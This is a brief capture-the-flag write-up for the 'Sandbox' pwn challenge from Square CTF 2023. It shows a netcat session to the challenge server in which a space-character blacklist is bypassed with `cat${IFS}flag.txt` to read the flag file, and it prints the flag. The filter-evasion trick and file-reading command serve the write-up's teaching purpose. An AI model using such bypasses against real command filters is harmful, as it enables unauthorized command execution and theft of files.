---
title: Sandbox
type: writeup
date: 2024-02-19T14:54:01+02:00
description: Writeup for Sandbox [Square CTF 2023]
author: H0N3YP0T
tags:
- pwn
draft: false
---
___

## Challenge Description

I "made" "a" "python" "sandbox" """"
nc 184.72.87.9 8008

## Intuition

It seems the server blacklist the space character so I am not able to `cat flag.txt`.

## Solution

Escape the space character by using the following command:

```bash
┌──🮤 HON3YP0T🮥─🮤 192.168.0.234🮥─🮤直 192.168.0.17🮥
├──🮤  ~🮥
└─   nc 184.72.87.9 8008                                            [11:51PM ]
Hi! Welcome to the kidz corner sandbox! we made it super safe in here - you can execute whatever command you want, but only one word at a time so you can't do anything too dangerous, like steal our flags!
cat${IFS}flag.txt
flag{did_you_use_ifs_or_python_let_me_know_down_in_the_comments}
```

### Flag

`flag{did_you_use_ifs_or_python_let_me_know_down_in_the_comments}`

